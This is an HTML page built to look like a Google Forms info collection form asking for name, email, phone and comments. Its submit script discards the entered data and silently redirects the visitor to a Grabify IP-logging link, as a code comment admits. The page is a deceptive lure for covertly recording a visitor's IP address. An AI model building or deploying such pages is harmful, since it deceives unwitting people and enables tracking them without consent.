<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Info Collection Form</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Google Fonts: Roboto -->
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
  <style>
    body {
      background: #f0ebf8;
      font-family: 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }
    .form-container {
      background: #fff;
      max-width: 560px;
      margin: 48px auto;
      border-radius: 10px;
      box-shadow: 0 6px 32px rgba(60,60,60,0.18);
      padding: 40px 40px 32px 40px;
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .form-title {
      font-size: 2.2em;
      font-weight: 500;
      color: #2c2c2c;
      margin-bottom: 10px;
      letter-spacing: .01em;
    }
    .form-desc {
      font-size: 1.13em;
      color: #666;
      margin-bottom: 22px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      color: #202124;
      margin-bottom: 7px;
      font-size: 1.1em;
      font-weight: 500;
      letter-spacing: .01em;
    }
    .form-required {
      color: #d93025;
      font-size: 1.1em;
      margin-left: 2px;
      font-weight: 700;
    }
    .form-input,
    .form-textarea {
      width: 100%;
      border: none;
      border-radius: 4px 4px 0 0;
      font-size: 1.06em;
      padding: 12px 10px 9px 12px;
      outline: none;
      background: #f5f5f5;
      transition: box-shadow 0.19s, border-bottom 0.18s;
      box-shadow: 0 1px 0 #dadce0;
      border-bottom: 2px solid transparent;
      font-family: inherit;
      resize: none;
    }
    .form-input:focus,
    .form-textarea:focus {
      background: #fff;
      border-bottom: 2px solid #673ab7;
      box-shadow: 0 2px 0 #673ab7;
    }
    .form-textarea {
      min-height: 76px;
      resize: vertical;
    }
    .form-button {
      background: linear-gradient(90deg, #673ab7 0%, #7e57c2 100%);
      color: #fff;
      font-weight: 500;
      font-size: 1.16em;
      padding: 11px 0;
      border: none;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(100,0,200,.08);
      cursor: pointer;
      margin-top: 6px;
      letter-spacing: .03em;
      transition: background 0.16s;
      width: 160px;
      align-self: flex-start;
    }
    .form-button:hover {
      background: linear-gradient(90deg, #5e35b1 0%, #7c43bd 100%);
    }
    /* Helper text for required fields */
    .required-helper {
      font-size: 0.95em;
      color: #d93025;
      margin-bottom: 12px;
      margin-top: -14px;
    }
    /* Mobile Responsive */
    @media (max-width: 640px) {
      .form-container {
        max-width: 99vw;
        margin: 16px 0;
        padding: 22px 5vw 20px 5vw;
      }
      .form-title {
        font-size: 1.45em;
      }
    }
  </style>
</head>
<body>
  <div class="form-container">
    <div class="form-title">Info Collection Form</div>
    <div class="form-desc">Please fill in the required details below. <span style="color:#d93025">*</span> indicates required field.</div>
    <form id="infoForm">
      <div class="form-group">
        <label class="form-label" for="name">Name <span class="form-required">*</span></label>
        <input class="form-input" type="text" id="name" name="name" required>
      </div>
      <div class="form-group">
        <label class="form-label" for="email">Email <span class="form-required">*</span></label>
        <input class="form-input" type="email" id="email" name="email" required>
      </div>
      <div class="form-group">
        <label class="form-label" for="phone">Phone</label>
        <input class="form-input" type="text" id="phone" name="phone">
      </div>
      <div class="form-group">
        <label class="form-label" for="comments">Comments</label>
        <textarea class="form-textarea" id="comments" name="comments"></textarea>
      </div>
      <button class="form-button" type="submit" onclick="submitAndRedirect(event)">
        Submit
      </button>
    </form>
  </div>
  <script>
    function submitAndRedirect(e) {
      e.preventDefault(); // Prevent normal form submission
      // Optionally, validate form here
      // To log IP via Grabify, redirect after submit
      window.location.href = "https://grabify.link/16ZFC4";
    }
  </script>
</body>
</html>
